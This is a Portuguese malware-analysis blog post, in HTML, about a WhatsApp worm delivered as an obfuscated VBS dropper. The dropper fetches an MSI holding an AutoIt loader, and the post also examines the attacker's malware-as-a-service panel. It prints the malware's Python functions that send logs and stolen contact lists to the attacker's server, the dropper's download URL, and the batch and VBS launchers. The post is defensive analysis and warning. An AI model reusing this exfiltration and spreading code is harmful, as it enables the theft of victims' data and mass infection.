<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Analisando um MaaS</title>
    <link rel="stylesheet" href="../../style/styles.css">
    <link rel="stylesheet" href="model.css"">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <div class="language-switcher">
        <a href="./whatsapp-worm-en.html" class="language-btn">
            <i class="fas fa-globe"></i>
            <span>EN</span>
        </a>
    </div>  
    <main>
        <article class="article-container">
            <div class="article-header">
                <h1 class="article-title">Analisando um MaaS</h1>
                <div class="article-meta">
                    <span class="article-tags">
                        <i class="fas fa-tags"></i>
                        <span class="tag">Web Application</span>
                        <span class="tag">Cyber Crime</span>
                        <span class="tag">Reverse Engineering</span>
                        <span class="tag">Malware Analysis</span>
                    </span>
                    <span class="article-date"><i class="far fa-calendar"></i> 14 de Novembro, 2025</span>
                </div>
            </div>

            <div class="article-content">
                <p><b>Aviso:</b> Este artigo é exclusivamente para fins educacionais e de pesquisa em segurança da informação, tambem como forma de alerta sobre golpes e malwares distribuídos na internet. A análise foi realizada em um ambiente controlado, sem qualquer tipo de atividade ilegal e todas informações coletadas e acessadas estavam públicas, para acesso de qualquer usuário. Não incentivo, apoio ou compactuo com qualquer atividade de hacking, invasão, exploração ou uso de malware sem a devida autorização e os requisitos legais apropriados.</p>
                <hr>
                <h2>Introdução</h2>
                <p>Recentemente, uma pessoa próxima a mim recebeu um arquivo suspeito no WhatsApp de uma pessoa desconhecida, ela estranhou e me enviou para analisar. Logo, já reconheci como sendo aqueles "Worms" de WhatsApp que se utilizam de phishing em massa para infectar pessoas.</p>
                <p>Decidi então fazer uma rápida análise.</p>
                <p>O arquivo vinha em formato <code>.vbs</code>, o que indica que é um script em Visual Basic</p>
                <img src="./assets/image1.png" alt="">
                <p>A mensagem chega em tom de urgência, justamente para afetar pessoas que estão com o dia cheio e prazos atrasados, ele sabe que elas não vão conseguir raciocinar antes de clicar em abrir.</p>
                <p>Jogando o arquivo no VirusTotal, vemos que apenas 10 AVs detectaram o arquivo como malicioso</p>
                <img src="./assets/image2.png" alt="">
                <pre><code>HASH MD5: E76BA682C7C3D8D190AB089595BB70E5
HASH SHA256: C2F431E24127D4735C28A2074C75C612092A12EBB7294A5CBB0230C3274AA0E7</code></pre>
                <p>Ao iniciar a análise do arquivo <code>.vbs</code>, vemos que ele se encontra ofuscado com aritmética em valores ASCII e operações matemáticas completamente desnecessárias.</p>
                <img src="./assets/image3.png" alt="">
                <p>Possuindo também o nome de variáveis ​​ofuscadas e códigos inuteis. Pedi a IA para me fazer um código para uma rápida desofuscação, e de fato, funcionou.</p>
                <pre><code>import re

data = """ARRAY HERE"""
parts = [p.strip() for p in data.split(",")]

decoded = ""
for p in parts:
    try:
        n = eval(p)
        decoded += chr(n)
    except Exception:
        pass

print(decoded)</code></pre>
                <p>Após desofuscar o malware, vemos sua real funcionalidade:</p>
                <img src="./assets/image4.png" alt="">
                <p>Ele é um dropper, baixando um instalador MSI do domínio</p>
                <code>empautlipa[.]com/altor/installer.msi</code>
                <p><br>Assim, vemos que ele tem prováveis duas fases</p>
                <p>1. Espalhar o malware para contatos do WhatsApp da vítima<br>2. Instalar um trojan na máquina da vítima</p><br>
                <h2>Whatsapp Worm</h2>
                <img src="./assets/image5.png" alt="">
                <p>Começamos analisando o arquivo <code>vbiud.py</code>, ou melhor, <code>whats.py</code>. Esse código Python contém todo o "core" de comunicação com o WhatsApp e automação de ações</p>
                <img src="./assets/image6.png" alt="">
                <p>O fluxo funciona assim:</p>
                <p>O atacante inicia o browser com o WhatsApp Web da vítima -> Exfiltra dados via APIs da URL maliciosa -> Gera mensagens automatizadas -> Espalha o malware para todos os contatos</p>
                <p>Típico desses "worms" de WhatsApp baseados em engenharia social que vemos acontecendo recentemente.</p>
                <p>Dentro do código, vemos outras funções interessantes para o envio de dados, como vemos nessa função de logs aqui abaixo:</p>
                <pre><code>def send_log(self, tipo: TipoLog, mensagem: str, detalhes: str = ""):
    """Envia log para o console e servidor"""
    # Cores para o console
    cores = {
        TipoLog.ERRO: '\033[91m',
        TipoLog.SUCESSO: '\033[92m',
        TipoLog.AVISO: '\033[93m',
        TipoLog.INFO: '\033[90m',
        TipoLog.INICIO: '\033[96m',
        TipoLog.FIM: '\033[96m'
    }
    reset_cor = '\033[0m'
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    cor = cores.get(tipo, '')
    
    print(f"{cor}[{timestamp}] {mensagem}{reset_cor}")
    if detalhes:
        print(f"         {detalhes}")
    
    # Enviar para servidor
    try:
        dados = {
            'session_id': SESSION_ID,
            'nome_maquina': NOME_MAQUINA,
            'tipo': tipo.value,
            'mensagem': mensagem,
            'detalhes': detalhes,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        requests.post(PHP_LOG_ENDPOINT, data=dados, timeout=3)
    except:
        pass</code></pre>
                <p>Assim, conseguimos imaginar como deva ser o painel do atacante:</p>
                <pre><code>-- Painel de Controle do Atacante: --

[14:23:45] PC-JOAO-2024 | ▶ Sistema iniciado 
[14:23:47] PC-MARIA-DESKTOP | ✓ WhatsApp carregado 
[14:24:02] NOTEBOOK-PEDRO | ⏸ Envio pausado 
[14:24:15] PC-ANA-HOME | ✓ 247 contatos enviados ao servidor</code></pre>
                <p>Ele também faz a exfiltração de contatos da vítima, com a função tendo um nome bem sugestivo.</p>
                <pre><code>def enviar_contatos_para_servidor(self, contatos: List[Contato]):
    """Envia os contatos obtidos do WhatsApp para o servidor PHP"""
    self.send_log(TipoLog.INFO, "Enviando contatos para o servidor")

    try:
        # Preparar dados para envio
        contatos_json = []
        for c in contatos:
            contatos_json.append({
                'numero': c.numero,
                'nome': c.nome
            })
        
        dados = {
            'session_id': SESSION_ID,
            'nome_maquina': NOME_MAQUINA,
            'contatos': json.dumps(contatos_json),
            'total': len(contatos),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Enviar para o servidor
        response = requests.post(PHP_CONTACTS_ENDPOINT, data=dados, timeout=10)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    self.send_log(TipoLog.SUCESSO, f"✓ {len(contatos)} contatos enviados ao servidor")
                else:
                    self.send_log(TipoLog.AVISO, "Servidor recebeu mas retornou erro")
            except:
                # Se não for JSON, assumir que foi enviado com sucesso
                self.send_log(TipoLog.SUCESSO, "✓ Contatos enviados ao servidor")
        else:
            self.send_log(TipoLog.AVISO, f"Servidor retornou status {response.status_code}")
            
    except Exception as e:
        self.send_log(TipoLog.AVISO, f"Não foi possível enviar contatos ao servidor: {e}")
        # Não é crítico se não conseguir enviar para o servidor</code></pre>
                <p>Bom, resumidamente é isso: ele se comunica com uma API do domínio malicioso para enviar e receber dados, faz a exfiltração de dados e espalha o malware para os contatos utilizando APIs. Agora, vamos dar uma olhada no <code>.msi</code> que ele baixa.</p>
                <br>
                <h2>MSI</h2>
                <p>Também jogamos ele no VirusTotal e 11 AVs o sinalizam como malicioso.</p>
                <img src="./assets/image7.png" alt="">
                <p>Iniciamos fazendo o desempacotamento do arquivo <code>.msi</code></p>
                <pre><code>lessmsi.exe x .\installer.msi</code></pre>
                <p>Arquivos <code>.msi</code> ou "Microsoft Installer", são pacotes de instalação padronizada do Windows, neles contêm arquivos, informações de configurações e instalações necessárias para instalar, atualizar ou remover um software.</p>
                <p>Diferente de um <code>.exe</code> comum, o <code>.msi</code> é um pacote de instalação estruturado, processado pelo Windows Installer, funcionando como um banco de dados com tabelas definindo arquivos, ações e configurações.</p>
                <p>Enquanto um binário executável costuma exigir engenharia reversa ou decompilação, o <code>.msi</code> não é decompilado, ele é apenas extraído e analisado como um conjunto de tabelas e arquivos.</p>
                <p>Abaixo está a estrutura de arquivos após desempacotamento</p>
                <pre><code>C:\USERS\RAVEN\DESKTOP\MALWARES\WPP-VBS\INSTALLER
└───SourceDir
    └───Public
        └───S4FSystems.S2D.65045730.8622.886
                8LOG39.tda
                8N3BdM.dmp
                feR0UqbB.exe
                kajr.bat
                kajr.vbs
                kvHeRzDt.log
                libeay32.dll
                sk4d.dll
                ssleay32.dll</code></pre>
                <br>
                <h2>AutoIt</h2>
                <p>Ele contém um executável <code>feR0UqbB.exe</code>, que na realidade é um AutoIt3.</p>
                <img src="./assets/image16.png" alt="">
                <p>AutoIt3 é uma linguagem de script usada para automatizar tarefas no Windows, como simular cliques de mouse e pressionamentos de teclas. Malwares podem usar o AutoIt compilado para automatizar/empacotar payloads.</p>
                <pre><code>MD5 AutoIt: 279274F8A137BF31425A9C2C14444B66
SHA256 AutoIt: bdd2b7236a110b04c288380ad56e8d7909411da93eed2921301206de0cb0dda1</code></pre>
                <p>Damos uma olhada no conteúdo do <code>.bat</code> e do <code>.vbs</code></p>
                <pre><code>type .\kajr.vbs
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "C:\Public\S4FSystems.S2D.65045730.8622.886"
WshShell.Run "feR0UqbB.exe kvHeRzDt.log", 0, False
Set WshShell = Nothing

type .\kajr.bat
@echo off
cd /d "C:\Public\S4FSystems.S2D.65045730.8622.886"
start "" "C:\Public\S4FSystems.S2D.65045730.8622.886\feR0UqbB.exe" "C:\Public\S4FSystems.S2D.65045730.8622.886\kvHeRzDt.log"
exit</code></pre>
                <p>Ambos passam o arquivo <code>kvHeRzDt.log</code> como argumento para o AutoIt, então deve ser ali que muito provavelmente se encontra o código malicioso.</p>
                <p>Para entender melhor o que ele faz, teríamos que realizar uma análise dinâmica, mas infelizmente não estou com todo esse tempo, então parto para ver como funciona o domínio do atacante, só por curiosidade.</p>
                <br>
                <h2>Domínio Malicioso</h2>
                <p>Entrando no domínio ele já começa efetuando downloads em nossa página, mas como vemos no código, existem alguns endpoints interessantes.</p>
                <pre><code>/api/contacts.php
/api/logs.php
/api/api.php
/api/config.php</code></pre>
                <p>Buscando um pouco mais, descobrimos arquivos de log com mais de 2GB expostos na aplicação, assim nos permitindo ver todas as requisições feitas, incluindo as do atacante.</p>
                <pre><code>172.69.138.215 - - [06/Nov/2025:18:48:19 +0000] "GET /api/contacts.php?action=sessoes&_=1762454900466 HTTP/1.1" 200 37 "https://empautlipa.com/dashboard.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"</code></pre>
                <p>Analisando os logs, vemos alguns endpoints interessantes, sendo um deles altamente preocupante!</p>
                <p>Um dos endpoints estava expondo uma lista com TODAS as pessoas infectadas, onde o atacante utilizava apenas como uma forma de visualização gráfica de sessões ativas.</p>
                <p>Vemos que ele também coleta informações bancárias das vítimas, provavelmente roubando acesso e dados bancários:</p>
                <img src="./assets/image8.png" alt="">
                <p>Pelo o menos mais de 6 mil pessoas foram infectadas por esse malware, o que é alarmante. Voltando a análise, descobrimos que existe um endpoint de login</p>
                <img src="./assets/image9.png" alt="">
                <p>E que existe um endpoint para upload de arquivos <code>.msi</code> aberto sem necessidade de autenticação, ou seja, qualquer um pode colocar um arquivo desse tipo ali.</p>
                <img src="./assets/image10.png" alt="">
                <p>Analisando a aplicação mais a fundo, percebemos que se trata de um MaaS (Malware as a Service) com direito a tutoriais</p>
                <img src="./assets/image11.png" alt="">
                <p>Descobri mais códigos maliciosos ofuscados depois de baixar alguns arquivos:</p>
                <img src="./assets/image12.png" alt="">
                <p>Enfim, provavelmente mais do mesmo. Após algumas buscas, consegui encontrar algumas coisas interessantes, coisas essas, que me permitiram acessar o painel administrativo</p>
                <img src="./assets/image13.png" alt="">
                <p>Vemos que existem algumas funções que estão disponíveis lá dentro</p>
                <img src="./assets/image14.png" alt="">
                <p>Com esse exemplo, vemos como uma engenharia social em massa pode afetar diversos desavisados. Esse tipo de ataque é extremamente perigoso! Pois se espalha rapidamente, e vendo o quão fraca é a segurança do próprio cibercriminoso, sabemos que pra eles isso tudo é descartável.</p>
                <img src="./assets/image15.png" alt="">               
                <p>O cara que contratou esse serviço provavelmente nem deve saber mexer nesse painel direito, e é apenas um amador. O verdadeiro problema é o cara que construiu isso, pois isso vai se repetir diversas vezes, se esse domínio cair outros 10 vão subir e assim sucessivamente.</p>
                <p>Por isso, é importante alertar as pessoas próximas a nós sobre os perigos que existem ao receber qualquer tipo de arquivo não esperado (ou até esperado) em redes sociais e aplicativos de mensagem, como o WhatsApp.</p>
                <p>No caso, o malware afetava apenas especificamente o WhatsApp Web em computadores Windows, o que salvou muitas pessoas de serem infectadas. Eu gostaria também de analisar o executável e o código malicioso que ele chama em tempo de execução, mas, tenho minhas obrigações a cumprir, então não irei além disso.</p>
            </div>

            <div class="article-footer">
                <a href="../../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Voltar para o início</a>
            </div>
        </article>
    </main>

    <footer>
        <div class="social-links">
            <a href="https://github.com/lsbxa" target="_blank"><i class="fab fa-github"></i></a>
            <a href="https://www.linkedin.com/in/marcelo-lisboa7/" target="_blank"><i class="fab fa-linkedin"></i></a>
        </div>
        <p>&copy; 2025 Memory Leak</p>
    </footer>
        <div id="imageModal" class="image-modal">
        <span class="image-modal-close">&times;</span>
        <img id="modalImage" src="" alt="">
    </div>

    <script>
        const modal = document.getElementById('imageModal');
        const modalImg = document.getElementById('modalImage');
        const closeBtn = document.querySelector('.image-modal-close');
        const images = document.querySelectorAll('.article-content img');

        images.forEach(img => {
            img.addEventListener('click', function() {
                modal.classList.add('active');
                modalImg.src = this.src;
            });
        });

        closeBtn.addEventListener('click', () => {
            modal.classList.remove('active');
        });

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
            }
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && modal.classList.contains('active')) {
                modal.classList.remove('active');
            }
        });
    </script>
</body>
</html>